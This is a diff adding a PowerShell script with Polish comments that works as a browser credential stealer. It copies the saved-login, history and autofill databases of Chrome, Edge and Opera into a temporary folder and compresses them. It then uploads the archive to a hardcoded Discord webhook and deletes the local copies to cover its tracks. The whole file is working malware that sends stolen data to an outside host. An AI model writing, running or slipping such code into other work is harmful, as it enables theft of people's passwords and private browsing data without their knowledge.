@@ -1,0 +1,51 @@
+# Lokalizacja plików przeglądarek
+$Paths = @{
+    Chrome = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
+    Edge = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
+    Opera = "$env:APPDATA\Opera Software\Opera Stable"
+}
+
+# Tymczasowy folder na dane
+$TempFolder = Join-Path $env:TEMP "BrowserData"
+New-Item -ItemType Directory -Path $TempFolder -Force | Out-Null
+
+# Kopiowanie plików przeglądarek
+foreach ($Browser in $Paths.Keys) {
+    $BrowserFolder = Join-Path $TempFolder $Browser
+    New-Item -ItemType Directory -Path $BrowserFolder -Force | Out-Null
+
+    foreach ($File in @("Login Data", "History", "Web Data")) {
+        $SourcePath = Join-Path $Paths[$Browser] $File
+        if (Test-Path $SourcePath) {
+            Copy-Item -Path $SourcePath -Destination $BrowserFolder -Force
+        }
+    }
+}
+
+# Kompresja danych do ZIP
+$ZipPath = Join-Path $env:TEMP "BrowserData.zip"
+if (Test-Path $ZipPath) { Remove-Item -Path $ZipPath -Force }
+Compress-Archive -Path $TempFolder -DestinationPath $ZipPath
+
+# Webhook Discord
+$WebhookURL = "https://discord.com/api/webhooks/1327027314587996321/3By2GaZl0B40tgJFqW-pJSjm09qg8bX6ogGi3g9T27d_nef7V-F8nJhUNL3VtUakMYtd"
+
+# Wysyłanie pliku ZIP na Discord
+$FileData = [System.IO.File]::ReadAllBytes($ZipPath)
+$EncodedFile = [Convert]::ToBase64String($FileData)
+
+$Boundary = "------------------------" + [System.Guid]::NewGuid().ToString()
+$Body = @"
+--$Boundary
+Content-Disposition: form-data; name="file"; filename="BrowserData.zip"
+Content-Type: application/zip
+
+$EncodedFile
+--$Boundary--
+"@
+
+Invoke-WebRequest -Uri $WebhookURL -Method POST -Body $Body -ContentType "multipart/form-data; boundary=$Boundary"
+
+# Czyszczenie plików tymczasowych
+Remove-Item -Recurse -Force $TempFolder
+Remove-Item -Force $ZipPath
